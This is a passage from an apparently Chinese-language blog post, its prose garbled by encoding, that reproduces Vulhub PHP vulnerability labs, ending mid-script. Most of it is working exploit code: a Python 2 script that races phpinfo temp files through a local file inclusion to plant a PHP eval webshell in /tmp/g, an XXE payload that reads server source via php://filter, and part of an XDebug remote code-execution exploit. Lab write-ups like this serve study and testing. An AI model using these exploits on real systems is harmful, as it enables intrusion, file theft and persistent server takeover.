é™¤</li><li>åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell</li></ol><h3 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>python2 expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">host, port</span>):</span></span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Vulhubä¸Šçš„ç¯å¢ƒæœ‰ä¸¤ä¸ªphpé¡µé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php</span><br><span class="line">lfi.php</span><br></pre></td></tr></table></figure><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506121755.png" style="zoom:80%;"><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506121709.png" style="zoom:80%;"><h2 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</h2><h3 id="æ¼æ´ç®€ä»‹-4"><a href="#æ¼æ´ç®€ä»‹-4" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´ä¸»è¦å±å®³ï¼šä»»æ„æ–‡ä»¶è¯»å–ï¼Œssrf</p><p>libxml2.9.0ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´XXEæ¼æ´é€æ¸æ¶ˆäº¡ã€‚</p><h3 id="æ¼æ´å¤ç°-4"><a href="#æ¼æ´å¤ç°-4" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç½‘ç«™ç›®å½•ç»“æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement.php  dom.php  index.php  simplexml_load_string.php</span><br></pre></td></tr></table></figure><p><strong>simplexml_load_string.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>SimpleXMLElement.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>dom.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æ„é€ è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506123059.png" style="zoom:80%;"><h2 id="XDebugè¿œç¨‹è°ƒè¯•æ¼æ´"><a href="#XDebugè¿œç¨‹è°ƒè¯•æ¼æ´" class="headerlink" title="XDebugè¿œç¨‹è°ƒè¯•æ¼æ´"></a>XDebugè¿œç¨‹è°ƒè¯•æ¼æ´</h2><h3 id="æ¼æ´ç®€ä»‹-5"><a href="#æ¼æ´ç®€ä»‹-5" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´å¯å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><p>XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®<code>remote_connect_back = 1</code>ï¼Œå³å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>ï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–<code>X-Forwarded-For</code>å¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚</p><h3 id="æ¼æ´å¤ç°-5"><a href="#æ¼æ´å¤ç°-5" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>å› ä¸ºéœ€è¦ä½¿ç”¨dbgpåè®®ä¸ç›®æ ‡æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥æ— æ³•ç”¨httpåè®®å¤ç°æ¼æ´</p><p>python3 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">1</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_xml</span>(<span class="params">sock</span>):</span></span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span>(<span class="params">url</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, help=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, help=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>, default=<span class="number">9000</span>, type=int, help=<span class="string">&#x27;local port&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(<span class="number">10</span>)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(<span 